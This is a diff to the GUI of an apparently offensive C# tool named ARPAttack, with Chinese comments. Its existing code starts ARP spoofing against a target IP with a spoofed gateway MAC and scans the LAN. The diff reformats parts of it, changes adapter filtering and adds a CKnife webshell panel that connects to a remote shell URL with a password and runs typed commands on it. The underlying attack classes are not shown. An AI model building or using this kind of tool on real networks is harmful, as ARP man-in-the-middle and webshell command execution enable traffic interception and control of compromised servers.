@@ -39,6 +39,8 @@ namespace ARPAttack
             CheckForIllegalCrossThreadCalls = false;
         }
 
+        CKnife cKnife;
+
         /// <summary>
         /// 初始化获取网卡列表
         /// </summary>
@@ -49,6 +51,12 @@ namespace ARPAttack
             richTextBox1.LoadFile("Law.rtf");
 
             devicesList = LibPcapLiveDeviceList.Instance;   //获取本机所有网卡
+
+            //显示网卡详细信息
+            //for (int i = 0; i < devicesList.Count; i++)
+            //{
+            //    MessageBox.Show(devicesList[i].ToString());
+            //}
 
             if (devicesList.Count < 1)
             {
@@ -64,16 +72,18 @@ namespace ARPAttack
         {
 
             //信息检查
-            if (txtRecipientIP.Text.Equals("")) {
+            if (txtRecipientIP.Text.Equals(""))
+            {
                 MessageBox.Show("靶机IP为空！");
                 return;
             }
 
             if (btnStart.Text.Equals("Start"))
             {
-                arpTool.StartARPSpoofing(txtSenderIP.Text, txtRecipientIP.Text,txtSenderMAC.Text,txtRecipientMAC.Text );
+                arpTool.StartARPSpoofing(txtSenderIP.Text, txtRecipientIP.Text, txtSenderMAC.Text, txtRecipientMAC.Text);
                 btnStart.Text = "Stop";
-            }else
+            }
+            else
             {
                 //TODO
                 arpTool.StopARPSpoofing();
@@ -81,14 +91,20 @@ namespace ARPAttack
             }
         }
 
+        /// <summary>
+        /// 获取网卡信息并将结果返回到UI，若选择的是虚拟网卡返回空值
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void combDevice_SelectedIndexChanged(object sender, EventArgs e)
         {
             // 获取相应的设备网关MAC，IP，本机MAC，IP
             device = devicesList[(sender as ComboBox).SelectedIndex];
-            if (device.Interface.FriendlyName.IndexOf("VMware") ==-1) {
+            if (device.Interface.FriendlyName.IndexOf("Adapter") == -1 && device.Interface.Description.IndexOf("LoopBack") == -1)
+            {
                 arpTool = new ARPTool(device);
                 arpTool.ScanStopedEvent += arpTool_ScanStopedEvent;
-                arpTool.ResolvedEvent += arpTool_ResolvedEvent;
+                //arpTool.ResolvedEvent += arpTool_ResolvedEvent;
                 arpTool.ResolvedTimeEvent += arpTool_ResolvedTimeEvent;
                 txtLocalIP.Text = arpTool.LocalIP.ToString();
                 txtLocalMAC.Text = Regex.Replace(arpTool.LocalMAC.ToString(), @"(\w{2})", "$1-").Trim('-');
@@ -97,7 +113,17 @@ namespace ARPAttack
                 txtSenderIP.Text = arpTool.GetwayIP.ToString();
                 txtSenderMAC.Text = Regex.Replace(GetRandomPhysicalAddress().ToString(), @"(\w{2})", "$1-").Trim('-');
             }
-            
+            else
+            {
+                txtLocalIP.Text = "";
+                txtLocalMAC.Text = "";
+                txtGatewayIP.Text = "";
+                txtGatewayMAC.Text = "";
+                txtSenderIP.Text = "";
+                txtSenderMAC.Text = "";
+
+            }
+
         }
 
         /// <summary>
@@ -124,14 +150,14 @@ namespace ARPAttack
             if (button.Text.Equals("Scan"))
             {
                 IPAddress ip;
-                if (!IPAddress.TryParse(txtRecipientIP.Text,out ip))
+                if (!IPAddress.TryParse(txtRecipientIP.Text, out ip))
                 {
                     MessageBox.Show("不合法的IP地址");
                     return;
                 }
 
                 button.Text = "Stop";
-                arpTool.ScanLAN(txtRecipientIP.Text, txtLocalMAC.Text,txtLocalIP.Text);
+                arpTool.ScanLAN(txtRecipientIP.Text, txtLocalMAC.Text, txtLocalIP.Text);
             }
             else
             {
@@ -155,6 +181,32 @@ namespace ARPAttack
         void arpTool_ResolvedTimeEvent(object sender, int e)
         {
             label6.Text = "send " + e + " time";
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textCKnifeURL.Equals("") || textCKnifeURL.Equals("http://")) return;
+            cKnife = new CKnife(textCKnifeURL.Text, textBoxCKnifePasswd.Text);
+            richTextShell.Text += cKnife.ShowPath();
+        }
+
+        private void textBoxCMD_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+
+                if (textBoxCMD.Text.Equals("")) return;
+
+                if (cKnife == null) { richTextShell.Text += "没有连接\r\n"; textBoxCMD.Text = ""; return; }
+
+                richTextShell.Text += cKnife.ShowResult(textBoxCMD.Text);
+                //richTextShell.Text = cKnife.ShowPath();
+                //富文本框滚动到最后一行
+                richTextShell.SelectionStart = richTextShell.TextLength;
+                richTextShell.ScrollToCaret();
+
+                textBoxCMD.Text = "";
+            }
         }
     }
 }
